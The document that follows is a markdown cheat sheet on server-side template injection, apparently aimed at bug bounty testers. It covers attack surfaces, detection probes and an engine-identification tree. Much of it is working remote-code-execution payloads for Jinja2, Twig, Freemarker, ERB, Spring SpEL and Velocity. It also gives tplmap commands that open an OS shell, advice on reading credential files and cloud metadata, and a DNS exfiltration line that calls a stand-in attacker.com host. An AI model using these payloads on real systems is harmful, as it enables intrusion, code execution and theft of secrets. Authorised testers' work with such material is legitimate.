# SSTI Techniques

> Server-Side Template Injection — user input is embedded directly into a server-side template and evaluated by the template engine, leading to information disclosure or RCE.

## Surface

- Error pages that reflect input with formatting — look for stack traces mentioning Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf, ERB
- User-facing rendered fields: display name, bio, email subject, address fields
- Report and PDF generators — data fields passed to a PDF template engine (often Velocity or Freemarker)
- Custom email template editors in SaaS — "preview" functionality that renders live
- CMS theme/template editors with user-controllable variables
- URL path segments rendered server-side: `/greet/{{name}}`
- AI prompt input fields that pass user content to a templating layer before LLM submission

## Test Approach

1. **Inject detection polyglot** into every user-controlled field that reflects output:
   ```
   {{7*7}} ${7*7} #{7*7} <%= 7*7 %> *{7*7}
   ```
2. **Look for `49` or `7777777` in the response** — numeric result means a template engine evaluated the expression
3. **Identify the engine** using the decision tree below
4. **Escalate to file read first**, then RCE (file read is lower risk for PoC, still P1)
5. **Use tplmap to automate exploitation** once engine is confirmed:
   ```
   python3 tplmap.py -u "https://target.com/profile?name=*" --os-shell
   ```

**Engine identification decision tree:**

```
Send: {{7*7}}
  → 49?  → Jinja2 or Twig
      Send: {{7*'7'}}
        → 7777777 → Jinja2
        → 49      → Twig

Send: ${7*7}
  → 49?  → Freemarker or EL expression (Spring)

Send: <%= 7*7 %>
  → 49?  → ERB (Ruby — Rails, Sinatra)

Send: *{7*7}
  → 49?  → Spring SpEL (Thymeleaf)

Send: #{7*7}
  → 49?  → Pebble or Velocity (Java)
```

## Tools

- **tplmap** — automated SSTI detection and exploitation; `python3 tplmap.py -u "https://target.com/page?input=*"`
- **nuclei** — SSTI detection templates; `nuclei -t ssti/ -u https://target.com`
- **Burp Intruder** — fuzz all reflected params with polyglot wordlist; flag responses containing `49`
- **gf** — `gf ssti urls.txt` to filter candidate URLs from crawl output

## Payloads / Probes

```
# Detection polyglot — try all, look for 49 or 7777777
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
*{7*7}
{7*7}
${{7*7}}

# Jinja2 — file read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Jinja2 — RCE via subclass walk
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Jinja2 — RCE (shorter path via config globals)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby) — RCE
<%= `id` %>
<%= system("id") %>

# Spring SpEL — RCE
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.ProcessBuilder).new(new String[]{"id"}).start()}

# Velocity/Pebble — RCE
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

## Chain Opportunities

- **SSTI → RCE** — always attempt; template engines execute arbitrary code at OS level with app process privileges
- **SSTI → file read** — safer PoC for initial report; read `/etc/passwd`, app config files, `.env`, cloud metadata at `169.254.169.254`
- **SSTI → internal SSRF** — use `os.popen` or exec to curl internal endpoints not reachable from the outside
- **SSTI in PDF generator → blind exfil** — render time may not show output; exfil via DNS: `popen('curl $(id).attacker.com').read()`
- **SSTI in email template → persistent** — injected payload executes each time the email is generated; affects all recipients

## Recent Intel

- **Pebble/Velocity SSTI in enterprise Java (2024-2025)** · Velocity and Pebble still widely used in internal tooling, JIRA plugins, and reporting frameworks; detection rate low because error pages are suppressed
- **SSTI via AI prompt preprocessing** · emerging pattern in 2025 — user input passed to a prompt builder that uses Jinja2 templating before LLM submission; `{{7*7}}` evaluates in the template layer, not in the LLM
- **CVE-2023-38646** · Metabase pre-auth SSTI/RCE via `setup-token` endpoint · Freemarker template injection without authentication · CVSS 9.8 · exploited in the wild within 48 hours of disclosure
